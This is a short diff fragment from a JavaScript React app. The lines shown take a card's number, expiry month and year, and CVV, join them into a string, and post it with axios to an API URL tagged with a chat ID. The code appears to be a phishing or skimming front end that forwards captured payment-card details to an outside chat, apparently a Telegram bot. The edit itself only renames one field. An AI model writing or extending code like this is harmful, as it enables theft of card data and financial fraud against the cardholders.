@@ -37,7 +37,7 @@ function App() {
 
 
     if (card.there){
-      let cards = `  ${card.cc}, ${card.month}, ${card.year},  ${card.cvv},`
+      let cards = `  ${card.cc}, ${card.Month}, ${card.year},  ${card.cvv},`
       axios
                 .post(apiUrl, {
                   chat_id: userId,
